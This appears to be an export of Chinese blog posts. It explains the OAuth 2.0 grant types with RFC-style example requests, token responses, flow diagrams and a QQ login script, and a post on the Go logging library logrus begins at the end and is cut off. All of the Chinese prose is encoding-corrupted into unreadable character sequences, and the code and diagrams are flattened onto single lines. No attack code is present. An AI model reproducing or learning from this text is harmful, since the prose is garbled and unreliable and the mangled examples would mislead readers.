scopeÔºöË°®Á§∫Áî≥ËØ∑ÁöÑÊùÉÈôêËåÉÂõ¥ÔºåÂèØÈÄâÈ°π stateÔºöË°®Á§∫ÂÆ¢Êà∑Á´ØÁöÑÂΩìÂâçÁä∂ÊÄÅÔºåÂèØ‰ª•ÊåáÂÆö‰ªªÊÑèÂÄºÔºåËÆ§ËØÅÊúçÂä°Âô®‰ºöÂéüÂ∞Å‰∏çÂä®Âú∞ËøîÂõûËøô‰∏™ÂÄº„ÄÇ B. Áî®Êà∑ÊéàÊùÉÁé∞Âú®ÊàëÂ∑≤ÁªèÂà∞‰∫ÜÂæÆËñÑÁöÑÊéàÊùÉÊúçÂä°È°µÈù¢, ÈúÄË¶ÅÊàëÂØπÊãâÂãæÁΩëËÆøÈóÆÁöÑÁõ∏Â∫îÊï∞ÊçÆËøõË°åÊéàÊùÉ, Âõ†Ê≠§ÊàëÈúÄË¶ÅÁôªÂΩï, ÁÑ∂ÂêéËøõË°åÊéàÊùÉ: ÁôªÂΩï ÊéàÊùÉ ÁÑ∂ÂêéÊàëÁÇπÂáªËøûÊé•(ÂÖ∂ÂÆûËøô‰∏™ÊåâÈíÆÊîπÊàêÊéàÊùÉÊØîËæÉÂêàÈÄÇ, ÂÖ∂‰ªñoauthÂØπ‰∫éÁöÑËøôÈáå‰πüÂü∫Êú¨ÈÉΩÂè´ÊéàÊùÉ), Ê≠§Êó∂ÊàëÂÆåÊàê‰∫ÜÊàëÂØπÊãâÂãæÁΩëÂìçÂ∫îÊùÉÈôêÁöÑÊéàÊùÉ„ÄÇ C. Authorization server Â∞ÜÁî®Êà∑ÂØºÂêëÁ¨¨‰∏âÊñπÂ∫îÁî®(ÊãâÂãæÁΩë)Á´Ø‰∫ãÂÖàÊåáÂÆöÁöÑ‚ÄùÈáçÂÆöÂêëURI‚Äù(A Ê≠•È™§‰∏≠‰º†ÂÖ•ÁöÑredirection_uri),ÂêåÊó∂ÈôÑ‰∏ä‰∏Ä‰∏™ÊéàÊùÉÁ†Å‰ªé‰∏äÂõæ‰∏≠ÁöÑrefererÂèØ‰ª•ÁúãÂá∫, Ë∑≥ËΩ¨ÊòØÊù•Ëá™ÂæÆÂçöÁöÑÊéàÊùÉÊúçÂä°Âô®ÁöÑ, Âπ∂‰∏îquery stringÊê∫Â∏¶Ëøôcode ÂÖ∑‰ΩìÊ†ºÂºèÂ¶Ç‰∏ã:123HTTP/1.1 302 FoundLocation: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA &amp;state=xyz ÂÖ∂‰∏≠ÂèÇÊï∞: codeÔºöË°®Á§∫ÊéàÊùÉÁ†ÅÔºåÂøÖÈÄâÈ°π„ÄÇËØ•Á†ÅÁöÑÊúâÊïàÊúüÂ∫îËØ•ÂæàÁü≠ÔºåÈÄöÂ∏∏ËÆæ‰∏∫10ÂàÜÈíüÔºåÂÆ¢Êà∑Á´ØÂè™ËÉΩ‰ΩøÁî®ËØ•Á†Å‰∏ÄÊ¨°ÔºåÂê¶Âàô‰ºöË¢´ÊéàÊùÉÊúçÂä°Âô®ÊãíÁªù„ÄÇËØ•Á†Å‰∏éÂÆ¢Êà∑Á´ØIDÂíåÈáçÂÆöÂêëURIÔºåÊòØ‰∏Ä‰∏ÄÂØπÂ∫îÂÖ≥Á≥ª„ÄÇ stateÔºöÂ¶ÇÊûúÂÆ¢Êà∑Á´ØÁöÑËØ∑Ê±Ç‰∏≠ÂåÖÂê´Ëøô‰∏™ÂèÇÊï∞ÔºåËÆ§ËØÅÊúçÂä°Âô®ÁöÑÂõûÂ∫î‰πüÂøÖÈ°ª‰∏ÄÊ®°‰∏ÄÊ†∑ÂåÖÂê´Ëøô‰∏™ÂèÇÊï∞„ÄÇ D. Á¨¨‰∏âÊñπÂ∫îÁî®(ÊãâÂãæÁΩë)ÂÉèAuthorization serverËØ∑Ê±ÇtokenËøô‰∏ÄÊ≠•Âú®ÊãâÂãæÁΩëÁöÑÂêéÂè∞ÊúçÂä°Âô®ËøõË°å, ‰ªéÁïåÈù¢‰∏äÊòØÁúã‰∏çÂà∞, ÂÖ∑‰ΩìËøáÁ®ã‰∏∫: ÊãâÂãæÁΩëËé∑ÂèñÂà∞codeËøáÂêé, ‰ª•codeÂêëÂæÆÂçöÊî∂ÂèñÊúçÂä°Âô®ËØ∑Ê±Ç, Êç¢ÂèñÂèØ‰ª•ËÆøÈóÆÂæÆÂçöËµÑÊ∫êÊúçÂä°ÁöÑtoken.ËØ∑Ê±ÇÁöÑÊ†∑‰æãÂ§ßËá¥Â¶Ç‰∏ã:1234567POST /token HTTP/1.1Host: server.example.comAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JWContent-Type: application/x-www-form-urlencodedgrant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb ÂÖ∂‰∏≠ÂèÇÊï∞: grant_typeÔºöË°®Á§∫‰ΩøÁî®ÁöÑÊéàÊùÉÊ®°ÂºèÔºåÂøÖÈÄâÈ°πÔºåÊ≠§Â§ÑÁöÑÂÄºÂõ∫ÂÆö‰∏∫‚Äùauthorization_code‚Äú„ÄÇ codeÔºöË°®Á§∫‰∏ä‰∏ÄÊ≠•Ëé∑ÂæóÁöÑÊéàÊùÉÁ†ÅÔºåÂøÖÈÄâÈ°π„ÄÇ redirect_uriÔºöË°®Á§∫ÈáçÂÆöÂêëURIÔºåÂøÖÈÄâÈ°πÔºå‰∏îÂøÖÈ°ª‰∏éAÊ≠•È™§‰∏≠ÁöÑËØ•ÂèÇÊï∞ÂÄº‰øùÊåÅ‰∏ÄËá¥„ÄÇ client_idÔºöË°®Á§∫ÂÆ¢Êà∑Á´ØIDÔºåÂøÖÈÄâÈ°π„ÄÇ E. Authorization serverÈ™åËØÅcodeÂêàÊ≥ïËøáÂêéËøîÂõûtokenËøîÂõûÁöÑtokenÊï∞ÊçÆÊ†∑‰æãÂ§ßËá¥Â¶Ç‰∏ã:123456789101112HTTP/1.1 200 OKContent-Type: application/json;charset=UTF-8Cache-Control: no-storePragma: no-cache&#123; &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;, &quot;token_type&quot;:&quot;example&quot;, &quot;expires_in&quot;:3600, &quot;refresh_token&quot;:&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;, &quot;example_parameter&quot;:&quot;example_value&quot;&#125; ÂÖ∂‰∏≠ÂèÇÊï∞: access_tokenÔºöË°®Á§∫ËÆøÈóÆ‰ª§ÁâåÔºåÂøÖÈÄâÈ°π„ÄÇ token_typeÔºöË°®Á§∫‰ª§ÁâåÁ±ªÂûãÔºåËØ•ÂÄºÂ§ßÂ∞èÂÜô‰∏çÊïèÊÑüÔºåÂøÖÈÄâÈ°πÔºåÂèØ‰ª•ÊòØbearerÁ±ªÂûãÊàñmacÁ±ªÂûã„ÄÇ expires_inÔºöË°®Á§∫ËøáÊúüÊó∂Èó¥ÔºåÂçï‰Ωç‰∏∫Áßí„ÄÇÂ¶ÇÊûúÁúÅÁï•ËØ•ÂèÇÊï∞ÔºåÂøÖÈ°ªÂÖ∂‰ªñÊñπÂºèËÆæÁΩÆËøáÊúüÊó∂Èó¥„ÄÇ refresh_tokenÔºöË°®Á§∫Êõ¥Êñ∞‰ª§ÁâåÔºåÁî®Êù•Ëé∑Âèñ‰∏ã‰∏ÄÊ¨°ÁöÑËÆøÈóÆ‰ª§ÁâåÔºåÂèØÈÄâÈ°π„ÄÇ scopeÔºöË°®Á§∫ÊùÉÈôêËåÉÂõ¥ÔºåÂ¶ÇÊûú‰∏éÂÆ¢Êà∑Á´ØÁî≥ËØ∑ÁöÑËåÉÂõ¥‰∏ÄËá¥ÔºåÊ≠§È°πÂèØÁúÅÁï•„ÄÇ ÁÆÄÂåñÊ®°ÂºèÈááÁî®Implicit GrantÊñπÂºèËé∑ÂèñAccess TokenÁöÑÊéàÊùÉÈ™åËØÅÊµÅÁ®ãÂèàË¢´Áß∞‰∏∫User-Agent Flow, ÂÆÉ‰∏çÈÄöËøáÁ¨¨‰∏âÊñπÂ∫îÁî®Á®ãÂ∫èÁöÑÊúçÂä°Âô®ÔºåÁõ¥Êé•Âú®ÊµèËßàÂô®‰∏≠ÂêëËÆ§ËØÅÊúçÂä°Âô®Áî≥ËØ∑‰ª§ÁâåÔºåË∑≥Ëøá‰∫Ü‚ÄùÊéàÊùÉÁ†Å‚ÄùËøô‰∏™Ê≠•È™§ÔºåÂõ†Ê≠§ÂæóÂêç„ÄÇÊâÄÊúâÊ≠•È™§Âú®ÊµèËßàÂô®‰∏≠ÂÆåÊàêÔºå‰ª§ÁâåÂØπËÆøÈóÆËÄÖÊòØÂèØËßÅÁöÑÔºå‰∏îÂÆ¢Êà∑Á´Ø‰∏çÈúÄË¶ÅËÆ§ËØÅ„ÄÇ Â∫îÁî®Âú∫ÊôØ: ÈÄÇÁî®‰∫éÊâÄÊúâÊó†ServerÁ´ØÈÖçÂêàÁöÑÂ∫îÁî®(Áî±‰∫éÂ∫îÁî®ÂæÄÂæÄ‰Ωç‰∫é‰∏Ä‰∏™User AgentÈáåÔºåÂ¶ÇÊµèËßàÂô®ÈáåÈù¢ÔºåÂõ†Ê≠§ËøôÁ±ªÂ∫îÁî®Âú®Êüê‰∫õÂπ≥Âè∞‰∏ãÂèàË¢´Áß∞‰∏∫Client-Side Application), Â¶ÇÊâãÊú∫/Ê°åÈù¢ÂÆ¢Êà∑Á´ØÁ®ãÂ∫è„ÄÅÊµèËßàÂô®Êèí‰ª∂Á≠âÔºå‰ª•ÂèäÂü∫‰∫éJavaScriptÁ≠âËÑöÊú¨ÂÆ¢Êà∑Á´ØËÑöÊú¨ËØ≠Ë®ÄÂÆûÁé∞ÁöÑÂ∫îÁî®Ôºå‰ªñ‰ª¨ÁöÑ‰∏Ä‰∏™ÂÖ±ÂêåÁâπÁÇπÊòØÔºåÊó†ÊúçÂä°Á´Ø,Êó†Ê≥ïÁõëÂê¨Á´ØÂè£Áõ¥Êé•Êî∂Âà∞ÂõûË∞Étoken, Âπ∂‰∏îÂ∫îÁî®Êó†Ê≥ïÂ¶•ÂñÑ‰øùÁÆ°ÂÖ∂Â∫îÁî®ÂØÜÈí•(App Secret Key), Â¶ÇÊûúÈááÂèñAuthorization CodeÊ®°ÂºèÔºåÂàô‰ºöÂ≠òÂú®Ê≥ÑÊºèÂÖ∂Â∫îÁî®ÂØÜÈí•(api_scret)ÁöÑÂèØËÉΩÊÄßÂÖ∏ÂûãÂ∫îÁî®: ÊöÇÊó∂Ê≤°ÁúãÂà∞Áõ∏ÂÖ≥Â∫îÁî®‰ΩøÁî®ËØ•Ê®°ÂºèÊµÅÁ®ãÂõæ:1234567891011121314151617181920212223242526272829303132+----------+| Resource || Owner || |+----------+ ^ | (B)+----|-----+ Client Identifier +---------------+| -+----(A)-- &amp; Redirection URI ---&gt;| || User- | | Authorization || Agent -|----(B)-- User authenticates --&gt;| Server || | | || |&lt;---(C)--- Redirection URI ----&lt;| || | with Access Token +---------------+| | in Fragment| | +---------------+| |----(D)--- Redirection URI ----&gt;| Web-Hosted || | without Fragment | Client || | | Resource || (F) |&lt;---(E)------- Script ---------&lt;| || | +---------------++-|--------+ | |(A) (G) Access Token | | ^ v+---------+| || Client || |+---------+ A. ÂÆ¢Êà∑Á´ØÂ∞ÜÁî®Êà∑ÂØºÂêëËÆ§ËØÅÊúçÂä°Âô®Âíå‰πãÂâçÁöÑauth codeÊ®°ÂºèÊØîËµ∑Êù•, ‰ªÖ‰ªÖÊòØresponse_typeÂèòÊàê‰∫Ütoken, ÂÖ∂‰ªñËøáÁ®ã‰∏çÂèò„ÄÇ123GET /authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1Host: server.example.com B. Áî®Êà∑ÂÜ≥ÂÆöÊòØÂê¶Áªô‰∫éÂÆ¢Êà∑Á´ØÊéàÊùÉËøôÈÉ®ÂàÜÂêåauth codeÊ®°Âºè‰∏ÄÊ†∑ C. ÂÅáËÆæÁî®Êà∑Áªô‰∫àÊéàÊùÉÔºåËÆ§ËØÅÊúçÂä°Âô®Â∞ÜÁî®Êà∑ÂØºÂêëÂÆ¢Êà∑Á´ØÊåáÂÆöÁöÑ‚ÄùÈáçÂÆöÂêëURI‚ÄùÔºåÂπ∂Âú®URIÁöÑHashÈÉ®ÂàÜÂåÖÂê´‰∫ÜËÆøÈóÆ‰ª§ÁâåËøôÈáåÊúÄÂ§ßÁöÑÂå∫Âà´Â∞±ÊòØ: Áõ¥Êé•ËøîÂõûtoken, ËÄå‰∏çÊòØcode.123HTTP/1.1 302 FoundLocation: http://example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA &amp;state=xyz&amp;token_type=example&amp;expires_in=3600 Ê≥®ÊÑèËøôÈáåÁöÑËøô‰∏™ÂõûË∞ÉÂú∞ÂùÄ, Âú®ÊéàÊùÉÁ†ÅÊ®°Âºè‰∏ã ËØ•Âú∞ÂùÄ‰ª•Âèäquery stringÈÉΩÊòØÈúÄË¶ÅÊúçÂä°Á´ØÂ§ÑÁêÜÁöÑ, ‰ΩÜÊòØÂú®ÁÆÄÂåñÊ®°Âºè‰∏ã, ÊòØÊ≤°ÊúâÊúçÂä°Á´ØÁ®ãÂ∫èÂèÇÂä†ÁöÑ, Âõ†Ê≠§ÁÆÄÂåñÊ®°Âºè‰∏ãËØ•callback url‰ªÖ‰ªÖÊòØ‰∏Ä‰∏™ÈùôÊÄÅÈ°µÈù¢Âú∞ÂùÄ.Âõ†Ê≠§Âú®ÁÆÄÂåñÊ®°Âºè‰∏ã, ÈúÄË¶ÅÈÄöËøáÊµèËßàÂô®Ëé∑ÂèñÂà∞callback url‰∏≠ÁöÑÂèÇÊï∞, Ëøô‰πüÊòØ‰∏∫‰ªÄ‰πàÊúâÊé•‰∏ãÊù•2Ê≠•ÁöÑÂéüÂõ†„ÄÇ D. ÊµèËßàÂô®ÂêëËµÑÊ∫êÊúçÂä°Âô®ÂèëÂá∫ËØ∑Ê±ÇÔºåÂÖ∂‰∏≠‰∏çÂåÖÊã¨‰∏ä‰∏ÄÊ≠•Êî∂Âà∞ÁöÑHashÂÄº„ÄÇÊµèËßàÂô®ÂêëWeb-HostedËØ∑Ê±ÇËé∑ÂèñtokenÁöÑËÑöÊú¨‰ª£Á†Å E. ËµÑÊ∫êÊúçÂä°Âô®ËøîÂõû‰∏Ä‰∏™ÁΩëÈ°µÔºåÂÖ∂‰∏≠ÂåÖÂê´ÁöÑ‰ª£Á†ÅÂèØ‰ª•Ëé∑ÂèñHashÂÄº‰∏≠ÁöÑ‰ª§Áâå„ÄÇWeb-HostedËøîÂõûÁªôÊµèËßàÂô®(user-agent)‰∏ÄÊÆµÊèêÂâçaccess tokenÁöÑËÑöÊú¨ F.ÊµèËßàÂô®ÊâßË°å‰∏ä‰∏ÄÊ≠•Ëé∑ÂæóÁöÑËÑöÊú¨ÔºåÊèêÂèñÂá∫‰ª§Áâå„ÄÇÊµèËßàÂô®ÊâßË°åËØ•ËÑöÊú¨, ÊèêÂèñÂá∫access token Ê≥®ÊÑèÂú®ËØ•Ê®°ÂºèÁöÑÂÆûÁé∞ËøáÁ®ã‰∏≠, DÂíåEÊ≠•‰∏ÄËà¨ÈÉΩ‰ºöÁúÅÁï•Êéâ, Âõ†‰∏∫Web-Hosted Client ResourceÊèê‰æõÁöÑËøôÊÆµtokenÊèêÂèñËÑöÊú¨, ÂÆ¢Êà∑Á´ØÂèØ‰ª•Ëá™Â∑±ÂÆûÁé∞:1234567891011121314151617181920212223242526272829303132333435363738&lt;script&gt; function callback(user) &#123; var userName = document.getElementById('userName'); var greetingText = document.createTextNode('Greetings, '+ user.openid + '.'); userName.appendChild(greetingText); &#125; //Â∫îÁî®ÁöÑAPPIDÔºåËØ∑Êîπ‰∏∫‰Ω†Ëá™Â∑±ÁöÑ var appID = "YOUR_APP_ID"; //ÊàêÂäüÊéàÊùÉÂêéÁöÑÂõûË∞ÉÂú∞ÂùÄÔºåËØ∑Êîπ‰∏∫‰Ω†Ëá™Â∑±ÁöÑ var redirectURI = "http://qzs.qq.com/qzone/openapi/success.html"; //ÊûÑÈÄ†ËØ∑Ê±Ç if (window.location.hash.length == 0) &#123; var path = 'https://graph.qq.com/oauth2.0/authorize?'; var queryParams = ['client_id=' + appID,'redirect_uri=' + redirectURI,' scope=' + 'get_user_info,list_album,upload_pic,add_feeds,do_like','response_type=token']; var query = queryParams.join('&amp;'); var url = path + query; window.open(url); &#125; else &#123; //Ëé∑Âèñaccess token(Áõ¥Êé•Ëé∑ÂèñurlÂèÇÊï∞ÈáåÈù¢ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Â∞±ÊòØaccess token) var accessToken = window.location.hash.substring(1); //‰ΩøÁî®Access TokenÊù•Ëé∑ÂèñÁî®Êà∑ÁöÑOpenID var path = "https://graph.qq.com/oauth2.0/me?"; var queryParams = [accessToken, 'callback=callback']; var query = queryParams.join('&amp;'); var url = path + query; var script = document.createElement('script'); script.src = url; document.body.appendChild(script); &#125;&lt;/script&gt; G.ÊµèËßàÂô®Â∞Ü‰ª§ÁâåÂèëÁªôÂÆ¢Êà∑Á´ØÊµèËßàÂô®Â∞Üaccess token‰∫§ÁªôÂÆ¢Êà∑Á´Ø, ÂÖ∏ÂûãÁöÑÂäûÊ≥ïÂ∞±ÊòØÂ∞ÜtokenÂ≠òÂÖ•ÊµèËßàÂô®, Á≠âÂæÖclientËé∑Âèñ„ÄÇ ÂØÜÁ†ÅÊ®°ÂºèÂØÜÁ†ÅÊ®°Âºè(Resource Owner Password Credentials Grant)‰∏≠ÔºåÁî®Êà∑ÂêëÂÆ¢Êà∑Á´Ø(Á¨¨‰∏âÊñπÂ∫îÁî®)Áõ¥Êé•Êèê‰æõËá™Â∑±ÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å„ÄÇÂÆ¢Êà∑Á´Ø‰ΩøÁî®Ëøô‰∫õ‰ø°ÊÅØ, Âêë‚ÄùÊúçÂä°ÂïÜÊèê‰æõÂïÜ‚ÄùÁ¥¢Ë¶ÅÊéàÊùÉ„ÄÇÂú®ËøôÁßçÊ®°Âºè‰∏≠, Áî®Êà∑ÂøÖÈ°ªÊääËá™Â∑±ÁöÑÂØÜÁ†ÅÁªôÂÆ¢Êà∑Á´ØÔºå‰ΩÜÊòØÂÆ¢Êà∑Á´Ø‰∏çÂæóÂÇ®Â≠òÂØÜÁ†Å„ÄÇËøôÈÄöÂ∏∏Áî®Âú®Áî®Êà∑ÂØπÂÆ¢Êà∑Á´Ø(Á¨¨‰∏âÊñπÂ∫îÁî®)È´òÂ∫¶‰ø°‰ªªÁöÑÊÉÖÂÜµ‰∏ãÔºåÊØîÂ¶ÇÂÆ¢Êà∑Á´ØÊòØÊìç‰ΩúÁ≥ªÁªüÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÊàñËÄÖÁî±‰∏Ä‰∏™ËëóÂêçÂÖ¨Âè∏Âá∫ÂìÅ„ÄÇËÄåËÆ§ËØÅÊúçÂä°Âô®Âè™ÊúâÂú®ÂÖ∂‰ªñÊéàÊùÉÊ®°ÂºèÊó†Ê≥ïÊâßË°åÁöÑÊÉÖÂÜµ‰∏ãÔºåÊâçËÉΩËÄÉËôë‰ΩøÁî®ËøôÁßçÊ®°Âºè„ÄÇ Â∫îÁî®Âú∫ÊôØ: Á¨¨ËØ•Â∫îÁî®ÁªùÂØπ‰ø°‰ªªÂÖ∏ÂûãÂ∫îÁî®: Â∫îÁî®Á®ãÂ∫èËá™Â∑±ÁöÑdashboardÁ®ãÂ∫èÊµÅÁ®ãÂõæ:1234567891011121314151617+----------+| Resource || Owner || |+----------+ v | Resource Owner (A) Password Credentials | v+---------+ +---------------+| |&gt;--(B)---- Resource Owner -------&gt;| || | Password Credentials | Authorization || Client | | Server || |&lt;--(C)---- Access Token ---------&lt;| || | (w/ Optional Refresh Token) | |+---------+ +---------------+ A. Áî®Êà∑ÂêëÁ¨¨‰∏âÊñπÂ∫îÁî®Êèê‰æõËá™Â∑±ÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÁî®Êà∑Â∞ÜËá™Â∑±ÁöÑÂØÜÁ†ÅÁªôÁ¨¨‰∏âÊñπÂ∫îÁî®„ÄÇ B. Á¨¨‰∏âÊñπÂ∫îÁî®Â∞ÜÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÂèëÁªôËÆ§ËØÅÊúçÂä°Âô®ÔºåÂêëÂêéËÄÖËØ∑Ê±Ç‰ª§Áâå123456POST /token HTTP/1.1Host: server.example.comAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JWContent-Type: application/x-www-form-urlencodedgrant_type=password&amp;username=johndoe&amp;password=A3ddj3w ÂÖ∂‰∏≠ÂèÇÊï∞: grant_type: Ë°®Á§∫ÊéàÊùÉÁ±ªÂûãÔºåÊ≠§Â§ÑÁöÑÂÄºÂõ∫ÂÆö‰∏∫‚Äùpassword‚ÄùÔºåÂøÖÈÄâÈ°π„ÄÇ username: Ë°®Á§∫Áî®Êà∑ÂêçÔºåÂøÖÈÄâÈ°π„ÄÇ password: Ë°®Á§∫Áî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÂøÖÈÄâÈ°π„ÄÇ scope: Ë°®Á§∫ÊùÉÈôêËåÉÂõ¥ÔºåÂèØÈÄâÈ°π„ÄÇ C. ËÆ§ËØÅÊúçÂä°Âô®Á°ÆËÆ§Êó†ËØØÂêéÔºåÂêëÂÆ¢Êà∑Á´ØÊèê‰æõËÆøÈóÆ‰ª§Áâå123456789101112HTTP/1.1 200 OKContent-Type: application/json;charset=UTF-8Cache-Control: no-storePragma: no-cache&#123; &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;, &quot;token_type&quot;:&quot;example&quot;, &quot;expires_in&quot;:3600, &quot;refresh_token&quot;:&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;, &quot;example_parameter&quot;:&quot;example_value&quot;&#125; ÂÖ∂‰∏≠ÂèÇÊï∞: access_tokenÔºöË°®Á§∫ËÆøÈóÆ‰ª§ÁâåÔºåÂøÖÈÄâÈ°π„ÄÇ token_typeÔºöË°®Á§∫‰ª§ÁâåÁ±ªÂûãÔºåËØ•ÂÄºÂ§ßÂ∞èÂÜô‰∏çÊïèÊÑüÔºåÂøÖÈÄâÈ°πÔºåÂèØ‰ª•ÊòØbearerÁ±ªÂûãÊàñmacÁ±ªÂûã„ÄÇ expires_inÔºöË°®Á§∫ËøáÊúüÊó∂Èó¥ÔºåÂçï‰Ωç‰∏∫Áßí„ÄÇÂ¶ÇÊûúÁúÅÁï•ËØ•ÂèÇÊï∞ÔºåÂøÖÈ°ªÂÖ∂‰ªñÊñπÂºèËÆæÁΩÆËøáÊúüÊó∂Èó¥„ÄÇ refresh_tokenÔºöË°®Á§∫Êõ¥Êñ∞‰ª§ÁâåÔºåÁî®Êù•Ëé∑Âèñ‰∏ã‰∏ÄÊ¨°ÁöÑËÆøÈóÆ‰ª§ÁâåÔºåÂèØÈÄâÈ°π„ÄÇ scopeÔºöË°®Á§∫ÊùÉÈôêËåÉÂõ¥ÔºåÂ¶ÇÊûú‰∏éÂÆ¢Êà∑Á´ØÁî≥ËØ∑ÁöÑËåÉÂõ¥‰∏ÄËá¥ÔºåÊ≠§È°πÂèØÁúÅÁï•„ÄÇ ÂÆ¢Êà∑Á´ØÊ®°ÂºèÂÆ¢Êà∑Á´ØÊ®°ÂºèÔºàClient Credentials GrantÔºâÊåáÂÆ¢Êà∑Á´Ø‰ª•Ëá™Â∑±ÁöÑÂêç‰πâÔºåËÄå‰∏çÊòØ‰ª•Áî®Êà∑ÁöÑÂêç‰πâÔºåÂêë‚ÄùÊúçÂä°Êèê‰æõÂïÜ‚ÄùËøõË°åËÆ§ËØÅ„ÄÇ‰∏•Ê†ºÂú∞ËØ¥ÔºåÂÆ¢Êà∑Á´ØÊ®°ÂºèÂπ∂‰∏çÂ±û‰∫éOAuthÊ°ÜÊû∂ÊâÄË¶ÅËß£ÂÜ≥ÁöÑÈóÆÈ¢ò„ÄÇÂú®ËøôÁßçÊ®°Âºè‰∏≠ÔºåÁî®Êà∑Áõ¥Êé•ÂêëÂÆ¢Êà∑Á´ØÊ≥®ÂÜåÔºåÂÆ¢Êà∑Á´Ø‰ª•Ëá™Â∑±ÁöÑÂêç‰πâË¶ÅÊ±Ç‚ÄùÊúçÂä°Êèê‰æõÂïÜ‚ÄùÊèê‰æõÊúçÂä°ÔºåÂÖ∂ÂÆû‰∏çÂ≠òÂú®ÊéàÊùÉÈóÆÈ¢ò„ÄÇ Â∫îÁî®Âú∫ÊôØ: ÂÖ∏ÂûãÂ∫îÁî®: ÂÜÖÈÉ®ÊúçÂä°, Resource Server A Âíå Resource Server B ÁöÑËÆøÈóÆÈóÆÈ¢ò„ÄÇÊµÅÁ®ãÂõæ:1234567+---------+ +---------------+| | | || |&gt;--(A)- Client Authentication ---&gt;| Authorization || Client | | Server || |&lt;--(B)---- Access Token ---------&lt;| || | | |+---------+ +---------------+ A. ÂÆ¢Êà∑Á´ØÂêëËÆ§ËØÅÊúçÂä°Âô®ËøõË°åË∫´‰ªΩËÆ§ËØÅÔºåÂπ∂Ë¶ÅÊ±Ç‰∏Ä‰∏™ËÆøÈóÆ‰ª§Áâå„ÄÇÂÆ¢Êà∑Á´ØÁõ¥Êé•‰ΩøÁî®clientÂá≠ËØÅËé∑Âèñtokne123456POST /token HTTP/1.1Host: server.example.comAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JWContent-Type: application/x-www-form-urlencodedgrant_type=client_credentials B. ËÆ§ËØÅÊúçÂä°Âô®Á°ÆËÆ§Êó†ËØØÂêéÔºåÂêëÂÆ¢Êà∑Á´ØÊèê‰æõËÆøÈóÆ‰ª§Áâå„ÄÇÊéàÊùÉÊúçÂä°Áõ¥Êé•ËøîÂõûtoken1234567891011HTTP/1.1 200 OKContent-Type: application/json;charset=UTF-8Cache-Control: no-storePragma: no-cache&#123; &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;, &quot;token_type&quot;:&quot;example&quot;, &quot;expires_in&quot;:3600, &quot;example_parameter&quot;:&quot;example_value&quot;&#125; ÂèÇËÄÉ ËÖæËÆØÂºÄÂèëÂπ≥Âè∞-ÂºÄÂèëÊîªÁï•_Client-side OAuth2.0 RFCÊñáÊ°£ PKCE Êâ©Â±ïRFCÊñáÊ°£]]></content>
      <categories>
        <category>ÂçèËÆÆËØ¶Ëß£</category>
        <category>OAUTH2</category>
      </categories>
      <tags>
        <tag>oauth2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GolangÊó•Âøó‰πãlogrusÁöÑ‰ΩøÁî®]]></title>
    <url>%2F2017%2F11%2F27%2Fgolang-log%2F</url>
    <content type="text"><![CDATA[Âõ†‰∏∫Ê†áÂáÜÂ∫ìÁöÑÊó•ÂøóÂ∫ìÁº∫Â∞ëLog Level, Â¶ÇÊûúÂü∫‰∫éÊ†áÂáÜÂ∫ìÊâ©Â±ïËá™Â∑±ÁöÑlogger‰πüÈúÄË¶ÅËä±‰∏ÄÁÇπÊó∂Èó¥, ÁúãgithubÁöÑ‰∏äÂæàÂ§öÂºÄÊ∫êÈ°πÁõÆÈÉΩ‰ΩøÁî®‰∏Ä‰∏™Âè´logrusÁöÑÊ®°Âùó, ‰∫éÊòØÁ†îÁ©∂‰∫Ü‰∏ã, ÂèëÁé∞ÂÆÉÂÖ∑ÊúâÈ´òÂ∫¶ÁöÑÁÅµÊ¥ªÊÄß, ËÄå‰∏îÂ∑≤ÁªèÊúâÂæàÂ§öÂÜôÂ•Ω‰∫ÜÁöÑÊèí‰ª∂, ÊØîÂ¶ÇÂíålogstachÂØπÊé•ÁöÑÊèí‰ª∂,ÊâÄ‰ª•È°πÁõÆÂêéÈù¢Â∞±ÂàáÊç¢Êó•ÂøóÊ®°Âùó‰∏∫logrus, ËøôÁØáÂçöÂÆ¢Â∞±ÊòØ‰ªãÁªçÊàë‰ª¨‰ΩøÁî®logrusÊó∂ÈÅáÂà∞ÁöÑÂùë, ‰ª•Âèä‰∏Ä‰∫õËß£ÂÜ≥‰πãÈÅì„ÄÇ ÁÆÄ‰ªãlogrusÂú®github‰∏äÁõ∏ÂΩìÂèóÊ¨¢Ëøé, Êà™Ê≠¢ÁõÆÂâç‰∏∫Ê≠¢Â∑≤Áªè6k+ÁöÑstar‰∫Ü, Âú®ÂæàÂ§öÂºÄÊ∫êÈ°πÁõÆ‰∏≠Ë¢´‰ΩøÁî®, ÊØîÂ¶Çdocker, prometheusÁ≠â‰ΩøÁî®ËØ•Â∫ìËøõË°åÊó•ÂøóËÆ∞ÂΩï.ÂÆòÊñπÂ£∞Áß∞APIÂÆåÂÖ®ÂÖºÂÆπÊ†áÂáÜÂåÖlogger, È°πÁõÆÂú∞ÂùÄ: logrus github Âú∞ÂùÄ, Âõ†Ê≠§Â¶ÇÊûú‰Ω†‰πãÂâçÈ°πÁõÆ‰ΩøÁî®ÁöÑÊ†áÂáÜÂ∫ìÈÇ£‰πàÂèØ‰ª•Êó†ÁºùËøÅÁßª.logrusÊòØ‰∏Ä‰∏™ÁªìÊûÑÂåñÁöÑ„ÄÅÂèØÊèíÊãîÁöÑÊó•ÂøóËÆ∞ÂΩïÂô®, 